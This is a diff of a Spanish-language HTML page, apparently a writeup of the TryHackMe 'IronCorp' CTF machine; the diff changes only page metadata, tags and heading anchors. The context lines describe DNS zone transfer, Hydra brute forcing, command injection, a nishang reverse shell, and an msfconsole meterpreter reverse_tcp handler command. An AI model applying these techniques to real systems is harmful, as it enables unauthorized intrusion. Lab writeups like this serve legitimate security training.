@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1578,13 +1578,15 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/" class="single__tag" title="Tags">#Tags</a></li>
+
+  <li><a href="https://sckull.github.io/tags/metasploit/" class="single__tag" title="metasploit">#metasploit</a></li>
+
   <li><a href="https://sckull.github.io/tags/dig/" class="single__tag" title="dig">#dig</a></li>
 
   <li><a href="https://sckull.github.io/tags/lfi/" class="single__tag" title="lfi">#lfi</a></li>
 
   <li><a href="https://sckull.github.io/tags/nishang/" class="single__tag" title="nishang">#nishang</a></li>
-
-  <li><a href="https://sckull.github.io/tags/metasploit/" class="single__tag" title="metasploit">#metasploit</a></li>
 
 </ul>
     </div>
@@ -1630,7 +1632,7 @@
 </tr>
 </tbody>
 </table>
-<h2 id="nmap">NMAP</h2>
+<h2 id="nmap-">NMAP</h2>
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), rdp (3889) y el puerto dns (53) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1756,10 +1758,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Sat May  9 01:14:55 2020 -- 1 IP address (1 host up) scanned in 167.13 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="http-8080">HTTP 8080</h2>
+</div><h2 id="http-8080-">HTTP 8080</h2>
 <p>En el puerto 8080 encontramos una pagina en la que vemos un dashboard.<br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200508_011218.webp" alt="image" /></p>
-<h3 id="gobuster">GOBUSTER</h3>
+<h3 id="gobuster-">GOBUSTER</h3>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1793,7 +1795,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 root@upset:~/thm/ironcorp#
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="dig---dns-enumeration">DIG - DNS Enumeration</h2>
+</div><h2 id="dig---dns-enumeration-">DIG - DNS Enumeration</h2>
 <p>Utilizamos <code>DIG</code> para obtener informacion de los DNS.<br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200508_010758.webp" alt="image" /></p>
 <p>Hacemos una transferencia de zona y encontramos dos nuevos subdominios.<br />
@@ -1856,7 +1858,7 @@ root@upset:~/thm/ironcorp#
 </code></pre></td></tr></table>
 </div>
 </div><p>En los tres subdominios encontramos la misma pagina estatica.</p>
-<h2 id="http-11025">HTTP 11025</h2>
+<h2 id="http-11025-">HTTP 11025</h2>
 <p>En el puerto 11025 encontramos una pagina en la que vemos un formulario de email.<br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200508_235925.webp" alt="image" /></p>
 <p>En el subdominio <code>internal.ironcorp.me</code> al parecer no tiene nada<br />
@@ -1892,10 +1894,10 @@ root@upset:~/thm/ironcorp#
 root@upset:~/thm/ironcorp#
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="hydra">HYDRA</h3>
+</div><h3 id="hydra-">HYDRA</h3>
 <p>Utilizamos hydra para realizar un ataque de fuerza bruta en el subdominio <code>admin.ironcorp.me</code>, logramos encontrar las credenciales.<br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200509_021752.webp" alt="image" /></p>
-<h2 id="lficommand-injection---admin-area">LFI/Command Injection - Admin Area</h2>
+<h2 id="lficommand-injection---admin-area-">LFI/Command Injection - Admin Area</h2>
 <p>En el subdominio en el que encontramos las credenciales al iniciar sesion nos muestra una pagina en la que contiene un input para realizar querys.<br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200509_151918.webp" alt="image" /></p>
 <p>Al realizar alguna busqueda o query no nos devuelve ningun resultado, intentamos realizar un RFI mediante una shell php, asp, apsx, pero ninguna de estas funcionó, solamente nos trae el codigo fuente y lo muestra en la pagina más no lo ejecuta.</p>
@@ -1911,7 +1913,7 @@ root@upset:~/thm/ironcorp#
 <img src="/images/posts/thm/ironcorp/Screenshot_20200509_154038.webp" alt="image" /></p>
 <p>Intentamos ejecutar codigos en la maquina con <a href="https://owasp.org/www-community/attacks/Command_Injection"><strong>Command Injection</strong></a> utilizando <code>shell scape</code>. Logramos obtener la ejecucion de <code>whoami</code> y vemos que el usuario tiene permisos de super usuario (<strong>nt authority\system</strong>).</p>
 <p><img src="/images/posts/thm/ironcorp/Screenshot_20200509_154628.webp" alt="image" /></p>
-<h2 id="shell---administrator">SHELL - Administrator</h2>
+<h2 id="shell---administrator-">SHELL - Administrator</h2>
 <p>Utilizamos una de las shells que tiene nishang <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"><strong>Invoke-PowerShellTcp.ps1</strong></a>, en nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la siguiente linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1936,7 +1938,7 @@ root@upset:~/thm/ironcorp#
 <img src="/images/posts/thm/ironcorp/Screenshot_20200509_205522.webp" alt="image" /></p>
 <p>Y nuestra primera flag <strong>user.txt</strong><br />
 <img src="/images/posts/thm/ironcorp/Screenshot_20200509_205836.webp" alt="image" /></p>
-<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
 <p>Utilizamos metasploit para conseguir una shell meterpreter utilizando un payload en powershell.</p>
 <p><strong>metasploit</strong></p>
 <pre><code>msfconsole -x &quot;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 1337; set ExitOnSession false; exploit -j&quot;
@@ -3303,7 +3305,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3351,21 +3353,21 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#nmap">NMAP</a></li>
-        <li><a href="#http-8080">HTTP 8080</a>
+        <li><a href="#nmap-">NMAP</a></li>
+        <li><a href="#http-8080-">HTTP 8080</a>
           <ul>
-            <li><a href="#gobuster">GOBUSTER</a></li>
+            <li><a href="#gobuster-">GOBUSTER</a></li>
           </ul>
         </li>
-        <li><a href="#dig---dns-enumeration">DIG - DNS Enumeration</a></li>
-        <li><a href="#http-11025">HTTP 11025</a>
+        <li><a href="#dig---dns-enumeration-">DIG - DNS Enumeration</a></li>
+        <li><a href="#http-11025-">HTTP 11025</a>
           <ul>
-            <li><a href="#hydra">HYDRA</a></li>
+            <li><a href="#hydra-">HYDRA</a></li>
           </ul>
         </li>
-        <li><a href="#lficommand-injection---admin-area">LFI/Command Injection - Admin Area</a></li>
-        <li><a href="#shell---administrator">SHELL - Administrator</a></li>
-        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+        <li><a href="#lficommand-injection---admin-area-">LFI/Command Injection - Admin Area</a></li>
+        <li><a href="#shell---administrator-">SHELL - Administrator</a></li>
+        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
       </ul>
     </li>
   </ul>
